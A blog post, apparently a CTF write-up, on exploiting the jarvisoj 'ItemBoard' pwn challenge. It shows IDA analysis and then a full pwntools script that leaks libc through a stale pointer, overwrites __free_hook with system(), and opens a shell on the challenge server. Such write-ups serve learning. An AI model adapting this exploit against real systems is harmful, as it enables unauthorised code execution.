---
layout:     post
title:      jarvisoj ItemBoard
author:     wooy0ung
tags: 		pwn
category:  	writeup
---


>Problem Address:  
>https://www.jarvisoj.com  
>  
>Address:  
>nc pwn2.jarvisoj.com 9887  
<!-- more -->


### 0x00 IDA分析

拿到题目, 先运行一遍, 发现是一个物品清单类的小程序

![](/assets/img/writeup/pwn/2017-08-05-jarvisoj-itemboard/0x00.png)

拖到IDA分析, 定位到 new_item 方法, 此处存在 stack overflow 漏洞

![](/assets/img/writeup/pwn/2017-08-05-jarvisoj-itemboard/0x01.png)

再看看栈布局, item 处是一个 buf_ptr, 溢出到这里后可以控制该指针实现任意写

![](/assets/img/writeup/pwn/2017-08-05-jarvisoj-itemboard/0x02.png)

检查 remove_item 方法是否对指针置0

![](/assets/img/writeup/pwn/2017-08-05-jarvisoj-itemboard/0x03.png)

跟进 set_null 方法, 发现这个函数不起任何作用

![](/assets/img/writeup/pwn/2017-08-05-jarvisoj-itemboard/0x04.png)

这里其实是IDA优化过, 我们再看看汇编, 确实不能置0指针

![](/assets/img/writeup/pwn/2017-08-05-jarvisoj-itemboard/0x05.png)

而且 show_item 方法没有检查 inuse位, 结合 remove_item 处漏洞可以 leak libc_base

![](/assets/img/writeup/pwn/2017-08-05-jarvisoj-itemboard/0x06.png)


###  0x01 exploit

```
#!/usr/bin/python
# -*- coding:utf8 -*-

from pwn import *

Io = remote("pwn2.jarvisoj.com", 9887)
#Io = process('./itemboard')
bin = ELF('./itemboard')
libc = ELF('./libc-2.19.so')
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def new_item(name, length, content):
    Io.recvuntil('choose:')
    Io.sendline('1')
    Io.recvuntil('Item name?')
    Io.sendline(name)
    Io.recvuntil('len?')
    Io.sendline(str(length))
    Io.recvuntil('Description?')
    Io.sendline(content)
def show_item(num):
    Io.recvuntil('choose:')
    Io.sendline('3')
    Io.recvuntil('Which item?')
    Io.sendline(str(num))
    Io.recvuntil('Description:')
def remove_item(num):
    Io.recvuntil('choose:')
    Io.sendline('4')
    Io.recvuntil('Which item?')
    Io.sendline(str(num))

#------------------leak libc_base----------------
new_item('0',0x80,'A')
new_item('1',0x80,'B')
remove_item(0)

show_item(0)
leak_data = u64(Io.recv(6).ljust(8,'\x00'))
libc_base = leak_data - 0x3BE7B8
free_hook_ptr = libc_base + 0x3BDEE8
#libc_base = data-0x3c4b78
#free_hook_ptr = libc_base + 0x3C3EF8
system = libc_base + libc.symbols['system']
success("libc_base: " + hex(libc_base))
success("free_hook_ptr: " + hex(free_hook_ptr))
success("system: " + hex(system))

#------------------hijack & write------------------
payload = p64(system)
payload += 'a'*(1024 + 8-len(payload))
payload += p64(free_hook_ptr-8) # 将 system_addr 写进 free_hook_str

new_item('/bin/sh\x00',len(payload),payload)
remove_item(2) # 相当于调用 system('/bin/sh')

Io.interactive()
```

getshell

![](/assets/img/writeup/pwn/2017-08-05-jarvisoj-itemboard/0x07.png)